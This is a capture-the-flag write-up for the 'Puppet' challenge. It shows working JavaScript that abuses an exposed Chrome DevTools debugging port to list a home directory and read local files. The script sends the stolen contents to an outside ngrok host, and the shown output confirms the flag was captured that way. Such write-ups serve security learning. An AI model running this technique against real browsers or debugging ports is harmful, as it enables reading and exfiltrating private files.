# Puppet

The flag has a random name in ~/Documents \
Pwn my browser >:)

```javascript
const browser = await puppeteer.launch({
  dumpio: true,
  args: [
    '--disable-web-security',
    '--user-data-dir=/tmp/chrome',
    '--remote-debugging-port=5000',
    '--disable-dev-shm-usage', // Docker stuff
    '--js-flags=--jitless' // No Chrome n-days please
  ]
})
```

Challenge: http://35.225.84.51

Attachments: `puppet.zip`

## Solution

TLDR:
> Abuse [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
> as used [here](https://github.com/qxxxb/ctf/tree/master/2021/angstrom_ctf/watered_down_watermark)
> to list directories and read arbitrary files.

We have to read
`file:///home/inmate/Documents/flag_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.txt`.

```javascript
const browser = await puppeteer.launch({
  args: [
    '--disable-dev-shm-usage',
    '--disable-web-security',
    '--user-data-dir=/tmp/chrome',
    '--remote-debugging-port=5000'
  ]
})
```

The DevTools port is usually randomized but for this challenge it's fixed to
5000 so we don't have to do any painful port scanning.

Also we have `--disable-web-security`, which means Same-Origin Policy and CSP
are all out the window. However, `file:///` URLs are still protected.

Solution:
- Use the DevTools protocol to open `file:///home/inmate/Documents` and fetch
  `document.body.textContent` through the WebSocket
- Parse the HTML to get the filename of the flag, then use the same technique
  to read the file contents.

Caveats:
- Headless chrome chokes on `file:///` URLs that list directories, as mentioned
  [here](https://github.com/puppeteer/puppeteer/issues/5737)
- Workaround is to first do `view-source:file:///home/inmate/Documents` then
  `document.body.textContent`

My solution:

```javascript
const selfURL = "http://db7ec431f10a.ngrok.io";

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function report(data) {
  fetch(`${selfURL}/${encodeURIComponent(data)}`);
}

async function openPage(url) {
  const baseUrl = "http://localhost:5000";
  const devtoolsURL = `${baseUrl}/json/new?${encodeURIComponent(url)}`;
  const res = await fetch(devtoolsURL);
  const data = await res.json();
  await sleep(500); // Wait for the page to finish loading
  return data.webSocketDebuggerUrl;
}

function wsPromise(wsURL, onopen) {
  return new Promise((resolve, reject) => {
    window.ws = new WebSocket(wsURL);

    ws.onerror = (e) => {
      report("[ws.onerror] " + JSON.stringify(e));
      reject(e);
    };

    ws.onmessage = (e) => { resolve(e); };
    ws.onopen = () => ws.send(onopen);
  });
}

const documentsDir = "file:///home/inmate/Documents";

(async () => {
  var wsURL = await openPage("http://example.com");

  var res = await wsPromise(
    wsURL,
    JSON.stringify({
      id: 0,
      method: "Page.navigate",
      params: {
        url: `view-source:${documentsDir}`,
      },
    })
  );
  console.log("[Page.navigate]");
  console.log(res);

  var res = await wsPromise(
    wsURL,
    JSON.stringify({
      id: 0,
      method: "Runtime.evaluate",
      params: { expression: "document.body.textContent" },
    })
  );
  console.log("[Runtime.evaluate]");
  console.log(res);

  var html = JSON.parse(res.data).result.result.value;
  console.log("[html]")
  console.log(html)

  var doc = new DOMParser().parseFromString(html, "text/html");
  var scripts = Array.from(doc.querySelectorAll("script"));

  // On non-headless chrome, this should be 5
  var fileScripts = scripts.slice(2);

  var filenames = fileScripts.map(
    (x) => x.text.match(/addRow\("(?<filename>.*?)".*/).groups.filename
  );

  console.log("[filenames]")
  console.log(filenames);

  for (const filename of filenames) {
    var wsURL = await openPage(`${documentsDir}/${filename}`);
    var res = await wsPromise(
      wsURL,
      JSON.stringify({
        id: 0,
        method: "Runtime.evaluate",
        params: { expression: "document.body.textContent" },
      })
    );
    console.log("[Runtime.evaluate]");
    console.log(res);
    var file = JSON.parse(res.data).result.result.value
    report(`[${filename}] ${file}`);
  }
})();
```

Output:
```
HTTP Requests
-------------

GET /[flag_4835141fe1031b2cfece2f5ef524e1a1.txt] CCC{1f_0nly_th3r3_w4s_X55_0n_th3_d3vt00ls_p4g3}  404 File not found
GET /main.js                                                                                      200 OK
GET /                                                                                             200 OK
```
